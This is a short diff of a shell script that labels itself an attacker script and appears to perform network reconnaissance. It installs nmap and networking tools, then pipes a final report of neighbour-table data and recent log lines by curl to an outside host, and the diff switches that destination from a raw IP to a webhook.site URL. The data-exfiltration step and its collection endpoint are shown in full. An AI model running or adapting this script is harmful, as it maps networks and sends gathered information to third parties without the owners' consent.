@@ -3,7 +3,7 @@ set -e
 LOG=/tmp/attacker.log
 exec > "$LOG" 2>&1
 
-VPS="http://147.45.231.59:9999"
+WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"
 
 apk add --no-cache curl iproute2 python3 nmap >/dev/null 2>&1
 
@@ -124,6 +124,6 @@ echo "=== FINAL REPORT ==="
   cat /tmp/neigh.txt
   echo "=== full log ==="
   cat "$LOG" 2>/dev/null | tail -200
-} | curl -sS --max-time 30 --data-binary @- "$VPS?tag=L1-RECON-V3"
+} | curl -sS --max-time 30 --data-binary @- "$WH?tag=L1-RECON-V3"
 
 sleep 999999
